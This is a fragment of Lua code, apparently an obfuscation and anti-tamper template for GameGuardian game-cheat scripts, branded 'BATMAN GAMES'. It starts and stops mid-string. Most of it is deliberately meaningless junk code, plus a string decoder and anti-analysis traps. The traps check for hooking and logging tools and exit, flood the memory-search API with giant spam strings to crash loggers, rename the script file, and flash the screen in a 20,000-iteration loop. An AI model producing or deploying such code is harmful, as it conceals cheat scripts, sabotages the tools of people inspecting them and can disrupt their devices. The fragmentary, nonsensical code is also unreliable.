while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end _m = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
os.rename(gg.getFile() .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)), gg.getFile())
 for i = 1, 0 do i(-nil)(-nil)(-nil * 1)(-nil)(-nil)(-nil)(-nil * 1) end 
os.rename(gg.getFile(), gg.getFile() .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)))
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
for z = 1, 0 do local _ = {} if _.data ~= nil then break _.data = nil (-nil)((-nil)[nil] | nil | nil) _.n = _._.data._[z] _.g = _.n._[z] _.Batman = _.g._.n[z] _.TEAM = _.Batman._.n[z].data() _[z] = _.TEAM[u]  _[z] = nil _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _ (-nil * nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil * 1, 1<< nil), -nil} end local _ = {} _[''] = _ local x = (_)(_, _) x[1] = 1 end _ = nil _.TEAM = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end _m = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
os.rename(gg.getFile() .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)), gg.getFile())
local GBLQ = string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90))
for i = 1,5 do
local ii = i * i local iii = i / i local iiii = i + i local iiiii = i - i
local _ = i * ii * iii * iiii * iiiii local __ = i / ii / iii / iiii / iiiii local ___ = i + ii + iii + iiii + iiiii local ____ = i - ii - iii - iiii - iiiii local _____ = _ * __ * ___ * ____ / _ / __ / ___ / ____ + _ + __ + ___ + ____ - _ - __ - ___ - ____ local ssenl = load(_____) if load(_____) then ssenl() pcall(ssenl) load(_____)() ssenl().ssenl() else load(_____)  end
end
for i = 1,5 do
local ii = i * i local iii = i / i local iiii = i + i local iiiii = i - i
local _ = i * ii * iii * iiii * iiiii local __ = i / ii / iii / iiii / iiiii local ___ = i + ii + iii + iiii + iiiii local ____ = i - ii - iii - iiii - iiiii local _____ = _ * __ * ___ * ____ / _ / __ / ___ / ____ + _ + __ + ___ + ____ - _ - __ - ___ - ____ local ssenl = load(_____) if load(_____) then ssenl() pcall(ssenl) load(_____)() ssenl().ssenl() else load(_____)  end
end
 while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end
while(nil)do;local w={102,88,4,56,73}if(w.w)then;w.w=(w.w(w))end;end
while(nil)do;for w=w,w do;local w={102,88,4,56,73}if(w.w)then;w.w=w.w(w)end;for ww=w.w,w.w,w.w do;local ww={102,88,4,56,73}if(ww.w)then;ww.w=ww.w()end;for www=w,ww.w,w do;local www={102,88,4,56,73}if(www.w)then;www.w=www.w(w)end;for wwww=w,ww,www.w do;local wwww={102,88,4,56,73}if(wwww.w)then;wwww.w=wwww.w(w)end;local wwww={102,88,4,56,73}if(wwww.w)then;wwww.w=(wwww|www|ww|w)(w)end;end;local www={102,88,4,56,73}if(www.w)then;www.w=(true|www|ww|w)(w)end;end;local ww={102,88,4,56,73}if(ww.w)then;ww.w=(true|false|ww|w)(w)end;end;local w={102,88,4,56,73}if(w.w)then;w.w=(true|nil|false|nil|w|nil|false|true|nil)(w)end;return(true|false|nil)end;return;end
for i = 1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {15,3,100,23,98} _ = _() _ = -nil  _  = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _~= nil then   _ = _ (-nil * nil)()  _ = nil end  if _  == nil then  _ = {_, _(-nil)(-nil)(nil * 1, 1  << nil), -nil} end end local j = {15,3,100,23,98} j[''] = j local t = (j)(j, j) t[1] = 1 end
while(nil)do;for w=w,w do;local w={}if(w.w)then;w.w=w.w(w)end;for ww=w.w,w.w,w.w do;local ww={}if(ww.w)then;ww.w=ww.w()end;for www=w,ww.w,w do;local www={}if(www.w)then;www.w=www.w(w)end;for wwww=w,ww,www.w do;local wwww={}if(wwww.w)then;wwww.w=wwww.w(w)end;local wwww={}if(wwww.w)then;wwww.w=(wwww|www|ww|w)(w)end;end;local www={}if(www.w)then;www.w=(true|www|ww|w)(w)end;end;local ww={}if(ww.w)then;ww.w=(true|false|ww|w)(w)end;end;local w={}if(w.w)then;w.w=(true|nil|false|nil|w|nil|false|true|nil)(w)end;return(true|false|nil)end;return;end
while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end
while (nil)do;local o={}if (o.o(o(o.o(o.oo))))then if (o.oo) then oo={} if (oo.o(oo.oo))then;o.o=(o.o(o.o.o(o.oo(oo.o(oo.oo(o.o.o(o.o(o,o)))))))) o={o.o,o.o,o.o,oo.o,oo.oo} p = (nil),(nil)*(nil) o.p = p,p,p,p oo.oo.o = (nil),(nil)..","..o.p..","..(nil)*(nil)/(nil)..",(nil)" _G = {oo.oo.o,_G,oo.oo.o} gg = {oo.oo.o,gg,oo.oo.o} end;end;end;end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end

]]


xnxx =[[
if true then else return end if true then else return end
if true then else return end if true then else return end
if true then else return end if true then else return end


if true then else return end if true then else return end
local Key53 = 8186484168865098;local Key14 = 4887;local inv256
for x=1,0 do;local j={}if j.x~=nil then j.x=j.x()end;end;
local Germany = function(data)
data = data.sc
local K, F = Key53, 16384 + Key14 return (data:gsub('%x%x', function(c) local L = K % 274877906944 local H = (K - L) / 274877906944 local M = H % 128 c = tonumber(c, 16) local m = (c + (H - M) / 128) * (2*M + 1) % 256 K = L * F + H + c + m return string.char(m)end))end
while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;end
while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;end
]]
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


lock2 =[[

while not true do
    for _,_ in pairs(_ENV or {nil}) do
        repeat until false
    end
    for _=1,1 do
        if (function() return false end)() then break end
    end
    for __,___ in next, ({[1]=nil}) do end
end

local _ = {}
for i = 1, 1000 do
    if ((function(x)
        local v = x
        if v == 2 then
        elseif v == 1 or v then
            v = not v or v
            v = 1
        end
        return v
    end)("BLOCKED_KEY")) then
        
    end
end
local xxx = setmetatable({}, {
    __index = function(_, k)
        return function(...)
            return k .. tostring(...) .. tostring(math.random())
        end
    end
})

for _ = 1, 1000 do
    while false do
        for _, __ in ipairs({nil}) do
            if not false then
                break
            end
        end
    end
end

function xnx(_ENV)
    for _ = 1, 1 do
        local _ = {}
        if #_ > 0 then
            for k, v in pairs(_) do
                _[k] = v * 2
            end
        end
    end

    while false do
        local _ = function() return "nil" end
        if _() == "nil" then break end
    end

    return table.concat({
        xxx[1](nil),
        tostring(nil),
        math.random(100),
        tostring(nil),
        xxx[2](math.huge)
    }, "|")
end



while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end
gg.toast("Encrypt by ꧁ঔৣ☬✞ BATMAN GAMES ✞☬ঔৣ꧂")

	if true then
		if string.match('/' .. tostring(os.time()), '/([^/]+)$') ~= tostring(os.time()) then
			while true do
				if true then
					gg.alert('Error, time is not acceptable.')
					os.exit()
				end
				if false then
				end
			end
		end
	end
	
local GetTableSpam = {}
local b, toStr, GetSpamName = 0, tostring;

local tmp = (function()
  local tempString = ''
  while (b < (10^2)) do
    tempString = tempString .. toStr(b * b);
    b = b + 1
  end
  GetSpamName = (function() local HashName = '' for i = 1, 10 do HashName = "ðŸŒ¨ï¸" .. HashName .. "â˜ƒï¸" .. HashName .. "â„ï¸" end return HashName:rep(100) end)()
  return tempString;
end)();

local spam = "Boar"
local c, b = "'" .. math.random(1, 255) .. "'",  math.random(100, 300)
if tostring("@") == "" then
	return
end

for k, v in next, _ENV do
	if tostring(v):match("function: @.-:") then
		return
	end

local func = os.exit
if tostring(func):match("-") or tostring(func):match("//") or tostring(func):match("@") or tostring(func):match("%d+") then
	return
end
end

local spam_2 = "is top"

for i = 1, #tmp do
    GetTableSpam[i] = {["address"] = GetSpamName, ["flags"] = GetSpamName, ["value"] = GetSpamName, ["freeze"] = GetSpamName, ["name"] = GetSpamName, GetTableSpam[i - 1]}
    gg.refineNumber(GetTableSpam)
	gg.refineAddress(GetTableSpam)
end

local i;
for i in ipairs({tostring(gg),tostring(os),tostring(io),tostring(debug),tostring(math),tostring(table)}) do
if _ENV["string"]["match"](({tostring(gg),tostring(os),tostring(io),tostring(debug),tostring(math),tostring(table)})[i], "@") then
os.exit()
os.exit()
os["]==])..string.char(math.random(128,255),math.random(128,255),math.random(128,255),math.random(128,255))..([==["]()
gg.processKill()
return
end
end
if pcall(_ENV["os"]["exit"]) or _ENV["string"]["rep"]("'",'2')~="''" or not _ENV["debug"]["getinfo"](_ENV["tostring"])["isvararg"] or _ENV["debug"]["getinfo"](gg["searchNumber"])["what"]=="Lua" then 
repeat
  x= 0
      repeat
          x= x+1
           gg.setVisible(false)
           gg.sleep(0)
           gg.setVisible(true)
           gg.sleep(2000)
           gg.setVisible(false)
           gg.sleep(0)
           gg.setVisible(true)
       until x== 20000
        gg["sleep"](0)
      os.exit()
    until false
  end

_ENV["B1"]= _ENV["debug"]["getinfo"](gg.refineNumber).short_src
if _ENV["B1"]~=_ENV["debug"]["getinfo"](1).short_src and _ENV["B1"]~=gg.getFile() then
repeat
  x= 0
      repeat
          x= x+1
           gg.setVisible(false)
           gg.sleep(0)
           gg.setVisible(true)
           gg.sleep(2000)
           gg.setVisible(false)
           gg.sleep(0)
           gg.setVisible(true)
       until x== 20000
        gg["sleep"](0)
      os.exit()
    until false
  end
local i;
for i in ipairs({tostring(gg),tostring(os),tostring(io),tostring(debug),tostring(math),tostring(table)}) do
if _ENV["string"]["match"](({tostring(gg),tostring(os),tostring(io),tostring(debug),tostring(math),tostring(table)})[i], "@") then
repeat
  x= 0
      repeat
          x= x+1
           gg.setVisible(false)
           gg.sleep(0)
           gg.setVisible(true)
           gg.sleep(2000)
           gg.setVisible(false)
           gg.sleep(0)
           gg.setVisible(true)
       until x== 20000
        gg["sleep"](0)
      os.exit()
    until false
  end
end
if debug.getinfo(1).istailcall then
repeat
  x= 0
      repeat
          x= x+1
           gg.setVisible(false)
           gg.sleep(0)
           gg.setVisible(true)
           gg.sleep(2000)
           gg.setVisible(false)
           gg.sleep(0)
           gg.setVisible(true)
       until x== 20000
        gg["sleep"](0)
      os.exit()
    until false
  end

x=debug.getinfo(gg.searchNumber)
if x.what~=('Java') then 
os.exit() 
while true do 
end 
end 
local i = {}
local g = {}
local ppi, ppb
g["last"] = _ENV["gg"]["getFile"]()
g["DATA"] = _ENV["loadfile"](g["last"])
g["cpp"] = g["DATA"]
if g["cpp"] ~= nil then 
g["DATA"] = nil
local ppb = g["last"]:match("[^/]+$")
local ppi = "lohhhggg"
local pu = _ENV["gg"]["getResults"](5000)
_ENV["os"]["rename"](''..g["last"]..'', ''..g["last"]:gsub('/[^/]+$', '')..'/'..ppi..'') 
local prt = _ENV["loadfile"](''..g["last"]:gsub('/[^/]+$', '')..'/'..ppi..'')
if prt ~= nil then
_ENV["os"]["rename"](''..g["last"]:gsub('/[^/]+$', '')..'/'..ppi..'', ''..g["last"]:gsub('/[^/]+$', '')..'/'..ppb..'')
repeat
  x= 0
      repeat
          x= x+1
           gg.setVisible(false)
           gg.sleep(0)
           gg.setVisible(true)
           gg.sleep(2000)
           gg.setVisible(false)
           gg.sleep(0)
           gg.setVisible(true)
       until x== 20000
        gg["sleep"](0)
      os.exit()
    until false
  end
end
for i in _ENV["ipairs"]({
_ENV["tostring"](_ENV["gg"]),
_ENV["tostring"](_ENV["os"]),
_ENV["tostring"](_ENV["io"]),
_ENV["tostring"](_ENV["debug"]),
_ENV["tostring"](_ENV["math"]),
_ENV["tostring"](_ENV["table"])}) do 
if _ENV["string"]["match"](({
_ENV["tostring"](_ENV["gg"]),
_ENV["tostring"](_ENV["os"]),
_ENV["tostring"](_ENV["io"]),
_ENV["tostring"](_ENV["debug"]),
_ENV["tostring"](_ENV["math"]),
_ENV["tostring"](_ENV["table"])})[i], ("@")) then 
repeat
  x= 0
      repeat
          x= x+1
           gg.setVisible(false)
           gg.sleep(0)
           gg.setVisible(true)
           gg.sleep(2000)
           gg.setVisible(false)
           gg.sleep(0)
           gg.setVisible(true)
       until x== 20000
        gg["sleep"](0)
      os.exit()
    until false
  end
end
if _ENV["string"]["rep"]("a", 2) ~= "aa" then 
repeat
  x= 0
      repeat
          x= x+1
           gg.setVisible(false)
           gg.sleep(0)
           gg.setVisible(true)
           gg.sleep(2000)
           gg.setVisible(false)
           gg.sleep(0)
           gg.setVisible(true)
       until x== 20000
        gg["sleep"](0)
      os.exit()
    until false
  end
if ("a"):rep(2) ~= "aa" then 
repeat
  x= 0
      repeat
          x= x+1
           gg.setVisible(false)
           gg.sleep(0)
           gg.setVisible(true)
           gg.sleep(2000)
           gg.setVisible(false)
           gg.sleep(0)
           gg.setVisible(true)
       until x== 20000
        gg["sleep"](0)
      os.exit()
    until false
  end
if not _ENV["tostring"](_ENV["gg"]):find(("@")) then 
if not _ENV["tostring"](_ENV["debug"]):find(("@")) then 
if not _ENV["tostring"](_ENV["io"]):find(("@")) then 
if _ENV["tostring"](_ENV["string"]):find(("@")) then 
repeat
  x= 0
      repeat
          x= x+1
           gg.setVisible(false)
           gg.sleep(0)
           gg.setVisible(true)
           gg.sleep(2000)
           gg.setVisible(false)
           gg.sleep(0)
           gg.setVisible(true)
        until x== 20000
        gg["sleep"](0)
        os.exit()
      until false
     end
   end
 end 
end
if _G["debug"]["getlocal"](2, 4) == nil then
repeat
  x= 0
      repeat
          x= x+1
           gg.setVisible(false)
           gg.sleep(0)
           gg.setVisible(true)
           gg.sleep(2000)
           gg.setVisible(false)
           gg.sleep(0)
           gg.setVisible(true)
       until x== 20000
        gg["sleep"](0)
      os.exit()
    until false
  end
if not _G["utf8"] then
repeat
  x= 0
      repeat
          x= x+1
           gg.setVisible(false)
           gg.sleep(0)
           gg.setVisible(true)
           gg.sleep(2000)
           gg.setVisible(false)
           gg.sleep(0)
           gg.setVisible(true)
       until x== 20000
        gg["sleep"](0)
      os.exit()
    until false
  end

if _ENV["debug"]["traceback"] == nil then
return 
end

if _ENV["string"]["rep"]("a", 2) ~= "aa" then
while true do
_ENV["gg"]["alert"]("BATMAN")
return
Detectid()
end
end

if ("a"):rep(2) ~= "aa" then
while true do
_ENV["gg"]["alert"]("BATMAN")
return
Detectid()
end
end

local log = _ENV["string"]["char"](("255"),("255"),("255"),("255"),("255"),("255")):rep("999"):rep("999"):rep(4)
for i = 1,("3340") do
_ENV["gg"]["refineNumber"]("0",log,log,log,log,log,log,log)
end

local GG={"art","ART","Art","dec","Dec","DEC","hook","Hook","HooK","HOOK","log","Log","LOG",}
local _gg={gg.CACHE_DIR,gg.EXT_FILES_DIR,gg.EXT_CACHE_DIR,gg.FILES_DIR,gg.PACKAGE}
for i,v in pairs(GG) do
if string.find(tostring(_gg),v) or(not string.find(tostring(_gg),"com"))then
Error(true)
end
end

while gg.PACKAGE == "catch.Art.Tool.seatch" do
while true do
os.exit(print("꧁ঔৣ☬✞ BATMAN GAMES ✞☬ঔৣ꧂?"))
end
end
while gg.VERSION == "96.0" do
while true do
os.exit(print("꧁ঔৣ☬✞ BATMAN GAMES ✞☬ঔৣ꧂?"))
end
end
while gg.BUILD == "15993" do
while true do
os.exit(print("꧁ঔৣ☬✞ BATMAN GAMES ✞☬ঔৣ꧂?"))
end
end
while string.find(gg.EXT_CACHE_DIR,"com.Art.Tool") do
end
while string.find(gg.EXT_CACHE_DIR,"catch_.me_.if_.you_.can_93") do
end

_ENV["debug"]["getinfo"]=function(a)
return _ENV["debug"]["getinfo"]("TRISTRIS")
end

for i in string.gmatch(tostring(debug.traceback()), '(.-)\n') do
if string.match(i, '.(/.-):') and string.match(i, '.(/.-):') ~= gg.getFile() then

os.exit()

print("ï¸")
return
end
end

]] 

 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

AntiLasm=[[
while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..Block..[[
while (nil)do;local o=("꧁ঔৣ☬✞ BATMAN GAMES ✞☬ঔৣ꧂ ")end
mmk = '' for i = 1, math.random(5, 10) do
fname = string.char(math.random(97, 120))..string.char(math.random(97, 120))..string.char(math.random(97, 120))..string.char(math.random(97, 120))
mmk = mmk.."while(nil)do;goto PROX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname..";::PXXXX"..fname.."::;end\nlocal function FakeFunc"..fname.."()\nfucklog = fucklog\ngoto PXXXX"..fname.."\n::PXXXX"..fname.."::\nfucklog = nil;end\n" end
while (nil)do;local o=("꧁ঔৣ☬✞ BATMAN GAMES ✞☬ঔৣ꧂ ")end
mmk = '' for i = 1, math.random(5, 10) do
fname = string.char(math.random(97, 120))..string.char(math.random(97, 120))..string.char(math.random(97, 120))..string.char(math.random(97, 120))
mmk = mmk.."while(nil)do;goto PROX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname..";::PXXXX"..fname.."::;end\nlocal function FakeFunc"..fname.."()\nfucklog = fucklog\ngoto PXXXX"..fname.."\n::PXXXX"..fname.."::\nfucklog = nil;end\n" end
while (nil)do;local o=("꧁ঔৣ☬✞ BATMAN GAMES ✞☬ঔৣ꧂ ")end
mmk = '' for i = 1, math.random(5, 10) do
fname = string.char(math.random(97, 120))..string.char(math.random(97, 120))..string.char(math.random(97, 120))..string.char(math.random(97, 120))
mmk = mmk.."while(nil)do;goto PROX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname..";::PXXXX"..fname.."::;end\nlocal function FakeFunc"..fname.."()\nfucklog = fucklog\ngoto PXXXX"..fname.."\n::PXXXX"..fname.."::\nfucklog = nil;end\n" end
while (nil)do;local o=("꧁ঔৣ☬✞ BATMAN GAMES ✞☬ঔৣ꧂ ")end
mmk = '' for i = 1, math.random(5, 10) do
fname = string.char(math.random(97, 120))..string.char(math.random(97, 120))..string.char(math.random(97, 120))..string.char(math.random(97, 120))
mmk = mmk.."while(nil)do;goto PROX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname.." goto PXXXX"..fname..";::PXXXX"..fname.."::;end\nlocal function FakeFunc"..fname.."()\nfucklog = fucklog\ngoto PXXXX"..fname.."\n::PXXXX"..fname.."::\nfucklog = nil;end\n" end
while (nil)do;local o=("꧁ঔৣ☬✞ BATMAN GAMES ✞☬ঔৣ꧂ ")end
mmk = '' for i = 1, math.random(5, 10) do
fname = string.char(math.random(97, 120))..string.char(math.random(97, 120))..string.char(math.random(97, 120))..string.char(math.random(97, 120))
